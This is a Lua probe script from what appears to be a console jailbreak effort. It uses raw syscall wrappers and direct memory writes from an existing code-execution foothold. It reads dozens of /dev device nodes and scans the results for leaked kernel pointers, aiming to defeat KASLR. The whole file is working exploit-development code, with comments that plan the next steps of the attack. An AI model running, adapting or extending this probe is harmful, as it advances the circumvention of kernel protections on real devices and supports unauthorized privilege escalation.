-- CRASH_CLASS: MODERATE
-- PROBE 1071a: read() the nodes 1070a actually enumerated, not the subset we guessed.
-- 1038a covered usbctl/ajm/ajmi/gic/notification0/1/gc/dce. The real /dev listing (78 entries)
-- shows those names are NOT listed at all, while dipsw, sce_zlib, ctty, hmd_cmd, hmd_snsr,
-- hmd_3da, hmd_dist, hmd2_track/image/gen_data/slam_trace/gaze and deci_tty* never were read.
-- A dip-switch or HMD trace node that answers with a kernel structure is a KASLR leak.
print("=== PROBE 1071a: READ EVERY ENUMERATED DEVICE ===")
print("")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function as_addr(x) local m=tostring(x):match("0x(%x+)"); if m then return tonumber(m,16) end return to_num(x) end
local function hi_of(q) if type(q)=="table" and q.h then return q.h, q.l end local n=to_num(q) return math.floor(n/4294967296), n%4294967296 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rqw(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return v end return nil end

local sc_sig=mk(416); local sc_open=mk(5); local sc_read=mk(3); local sc_close=mk(6); local sc_pid=mk(20)
local act=memory.alloc(0x28); local aa=as_addr(act)
for o=0,0x20,8 do wd(aa+o,0) end
wd(aa,1)
local okS,vS=pcall(function() return sc_sig(uint64(12),uint64(aa),uint64(0)) end)
print(string.format("[S] sigsys-ignore ok=%s rv=%s pid=%s", tostring(okS), okS and tostring(to_num(vS)) or "-",
  tostring(to_num(select(2,pcall(function() return sc_pid() end))))))
print("")

local PB=0x100
local pa=as_addr(memory.alloc(PB))
local NB=0x400
local ba=as_addr(memory.alloc(NB))
local SENT=0xCDCDCDCD
local function setpath(p) for i=0,PB/4-1 do wd(pa+i*4,0) end for i=1,#p do wd(pa+i-1,p:byte(i)) end end
local function fill() for i=0,NB/8-1 do wq(ba+i*8,SENT) end end
local function scan()
  local t=0; local kp=0; local first=""
  for i=0,NB/8-1 do
    local vq=rqw(ba+i*8); local v=vq and to_num(vq) or -1
    if v~=SENT then
      t=t+1
      local h,l=hi_of(vq)
      if h>=0xFFFF8000 and not (h==0xFFFFFFFF and (l==0xFFFFFFFF or l==0)) and not (h==0 and l==0) then
        kp=kp+1
        if kp<=4 then first=first..string.format(" +%X=%X_%08X", i*8, h, l) end
      end
    end
  end
  return t,kp,first
end

-- The real 78-entry listing from 1070a, minus the ttys (deci_stdin blocked in read() even
-- with O_NONBLOCK and parked the whole loader for the rest of that run) and minus the nodes
-- 1038a already read. dmem0/1/2, a53mm, a53mmsys, dbggc, sbl_srv, encdec, uvd_dec/enc, fttrm,
-- duid, mp3, acm, lvd3 and rng were never touched by any probe in this repository.
-- Every node prints a marker first, so the last marker in the capture names the blocker.
local names={"dmem0","dmem1","dmem2","a53mm","a53mmsys","dbggc","sbl_srv","encdec",
  "uvd_dec","uvd_enc","fttrm","duid","mp3","acm","lvd3","rng","camera","sce_zlib",
  "dipsw","bt","hid","hmd_cmd","hmd_snsr","hmd_3da","hmd_dist",
  "hmd2_cmd","hmd2_imu","hmd2_leddet","hmd2_image","hmd2_gen_data","hmd2_gaze",
  "hmd2_track","hmd2_slam_trace","null","zero","random","urandom"}

local hits=0
for _,d in ipairs(names) do
  print("[>] "..d)
  setpath("/dev/"..d)
  local okf,fdv=pcall(function() return sc_open(uint64(pa),uint64(4),uint64(0)) end)
  local fd = okf and to_num(fdv) or -999
  if fd>=0 then
    fill()
    local okr,rv=pcall(function() return sc_read(uint64(fd),uint64(ba),uint64(NB)) end)
    local r = okr and to_num(rv) or -999
    local t,kp,first=scan()
    if kp>0 then hits=hits+1 end
    print(string.format("[R] %-14s fd=%d rv=%s touched=%d kp=%d%s", d, fd, tostring(r), t, kp, first))
    pcall(function() return sc_close(uint64(fd)) end)
  else
    print(string.format("[R] %-14s open=FAIL", d))
  end
end
print("")
print(string.format("[F] nodes with a kernel-range qword: %d", hits))
print("=== DONE 1071a ===")
